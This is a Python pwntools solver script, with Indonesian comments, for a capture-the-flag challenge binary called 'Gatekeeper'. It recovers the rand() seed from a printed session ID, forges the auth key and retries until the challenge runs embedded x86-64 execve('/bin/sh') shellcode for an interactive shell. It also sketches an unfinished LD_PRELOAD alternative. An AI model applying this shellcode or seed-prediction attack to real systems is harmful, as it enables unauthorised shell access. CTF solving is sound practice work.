#!/usr/bin/env python3
#!/usr/bin/env python3
"""
Solver Final: Tantangan Biner Gatekeeper

Root cause SIGILL:
  shellcode = byte_404140[0:24] XOR byte_4040D0[0:24]
  byte_404140 = rand() XOR (seed >> (i&7))  → RANDOM tiap run
  → shellcode random → SIGILL

Solusi:
  Karena seed = time() XOR pid, dan kita tahu Session ID → bisa recover seed
  → kita bisa PREDICT shellcode yang akan dirun
  → tinggal tunggu/loop sampai shellcode pertama dimulai dengan opcode valid
  → tapi ini tidak reliable

Solusi BENAR:
  byte_4040D0 adalah FIXED encrypted shellcode
  byte_404140 adalah KEY untuk decrypt
  Kita harus kirim key = byte_404140 (dari rand) untuk AUTH
  Setelah auth, binary XOR key[0:24] dengan byte_4040D0[0:24] → shellcode
  
  Karena kita TAHU byte_404140 (bisa hitung dari seed),
  kita juga TAHU shellcode yang akan dirun.
  
  Kalau shellcode crash (SIGILL) → coba lagi (pid/time beda tiap run)
  Kalau shellcode valid → kita dapat shell!
  
  ATAU: kita bisa patch binary untuk skip shellcode dan langsung spawn shell
  ATAU: kita set LD_PRELOAD untuk hook rand()

pip install pwntools
"""

from pwn import *
import ctypes, ctypes.util, time, subprocess, os

# ── Setup ─────────────────────────────────────────────────────
libc_c = ctypes.CDLL(ctypes.util.find_library("c"))
libc_c.srand.argtypes = [ctypes.c_uint]
libc_c.srand.restype  = None
libc_c.rand.argtypes  = []
libc_c.rand.restype   = ctypes.c_int

MOD      = 2**32
INV_MULT = pow(0xDEADBEEF, -1, MOD)

byte_4040D0 = bytes([
    0xA3, 0x73, 0x94, 0xF4, 0xA2, 0xDD, 0x4D, 0x40,
    0x6D, 0x66, 0x7E, 0x7D, 0x4D, 0x5A, 0xFA, 0xFD,
    0x24, 0x79, 0x28, 0xDB, 0x7D, 0x47, 0x6B, 0x6B
])

# Shellcode execve("/bin/sh") x86-64 (24 bytes)
TARGET_SHELLCODE = bytes([
    0x48, 0x31, 0xd2,               # xor rdx, rdx
    0x48, 0xbb, 0x2f, 0x2f, 0x62,   # movabs rbx, '//bin/sh'
    0x69, 0x6e, 0x2f, 0x73, 0x68,
    0x53,                           # push rbx
    0x48, 0x89, 0xe7,               # mov rdi, rsp
    0x48, 0x31, 0xc0,               # xor rax, rax
    0xb0, 0x3b,                     # mov al, 59
    0x0f, 0x05                      # syscall
])

# Key[0:24] yang akan menghasilkan shellcode valid:
REQUIRED_KEY_PREFIX = bytes([TARGET_SHELLCODE[i] ^ byte_4040D0[i] for i in range(24)])
log.info(f"Required key[0:24]: {REQUIRED_KEY_PREFIX.hex()}")

def c_srand(s): libc_c.srand(ctypes.c_uint(s))
def c_rand():   return libc_c.rand()

def recover_seed(session_id_hex):
    return (int(session_id_hex, 16) * INV_MULT) % MOD

def generate_key(seed):
    c_srand(seed)
    key = bytearray(32)
    for i in range(32):
        r = c_rand() & 0xFFFFFFFF
        key[i] = (r ^ (seed >> (i & 7))) & 0xFF
    return bytes(key)

def predict_shellcode(key):
    return bytes([key[i] ^ byte_4040D0[i] for i in range(24)])

def is_valid_shellcode(sc):
    """Cek apakah shellcode dimulai dengan opcode x86-64 yang valid"""
    if len(sc) < 2:
        return False
    # Harus dimulai dengan REX prefix atau opcode umum yang valid
    valid_starts = [
        0x48, 0x49, 0x4C, 0x4D,  # REX prefixes
        0x31, 0x33,               # XOR
        0x50, 0x51, 0x52, 0x53,   # PUSH
        0x55, 0x57,               # PUSH rbp/rdi
        0x90,                     # NOP
        0xEB, 0xE9,               # JMP
    ]
    # Hindari SIGILL triggers
    sigill_patterns = [b'\x0f\x0b', b'\xf1']
    for p in sigill_patterns:
        if sc.startswith(p):
            return False
    return sc[0] in valid_starts

# ── Main ─────────────────────────────────────────────────────
context.log_level = 'warning'

MAX_ATTEMPTS = 20
attempt = 0

log.info("Mencari run dimana shellcode valid (tidak SIGILL)...")
log.info("Strategi: loop sampai dapat seed yang menghasilkan shellcode valid")

while attempt < MAX_ATTEMPTS:
    attempt += 1
    
    try:
        io = process('./challenge', timeout=10)
        io.recvuntil(b"Session ID: ")
        session_id_hex = io.recvline().strip().decode()
        seed = recover_seed(session_id_hex)
        key  = generate_key(seed)
        sc   = predict_shellcode(key)
        
        key_hex = key.hex()
        
        log.info(f"[{attempt}] SID={session_id_hex} seed={hex(seed)} shellcode[0:4]={sc[:4].hex()}")
        
        # Prediksi apakah shellcode akan crash
        if not is_valid_shellcode(sc):
            log.warning(f"  → Shellcode invalid ({sc[:4].hex()}), skip...")
            # Kirim anyway untuk auth (supaya binary exit dan kita bisa coba lagi)
            io.recvuntil(b"[?] Key: ")
            io.sendline(key_hex.encode())
            io.close()
            time.sleep(0.1)
            continue
        
        log.success(f"  → Shellcode valid! ({sc[:4].hex()}) Mencoba auth...")
        io.recvuntil(b"[?] Key: ")
        io.sendline(key_hex.encode())
        
        resp = io.recvline(timeout=5).strip()
        log.info(f"  → Response: {resp.decode()}")
        
        if b"successful" in resp:
            log.success(f"Auth sukses! SID={session_id_hex}")
            log.success(f"Shellcode yang akan dirun: {sc.hex()}")
            log.info("Dropping into shell...")
            io.interactive()
            break
        else:
            log.warning(f"  Auth gagal?")
            io.close()
            
    except EOFError:
        log.warning(f"[{attempt}] EOF - shellcode crash (SIGILL), retry...")
        time.sleep(0.2)
    except Exception as e:
        log.warning(f"[{attempt}] Error: {e}")
        try:
            io.close()
        except:
            pass
        time.sleep(0.1)

if attempt >= MAX_ATTEMPTS:
    log.failure(f"Gagal dalam {MAX_ATTEMPTS} percobaan.")
    log.info("Coba jalankan ulang, atau gunakan approach LD_PRELOAD di bawah.")
    print("""
── Alternatif: LD_PRELOAD hook rand() ───────────────────────
Buat file hook.c:

    #include <stdlib.h>
    static unsigned char TARGET[] = {
        0xeb, 0x42, 0x46, 0xbc, 0x19, 0xf2, 0x62, 0x22,
        0x04, 0x08, 0x51, 0x0e, 0x25, 0x09, 0xb2, 0x74,
        0xc3, 0x31, 0x19, 0x1b, 0xcd, 0x7c, 0x64, 0x6e,
        // byte 24-31 bebas (tidak affect shellcode)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    // Tapi ini perlu seed-dependent... lebih baik pakai GDB.

Atau gunakan GDB untuk patch byte_404140 langsung setelah auth.
    """)
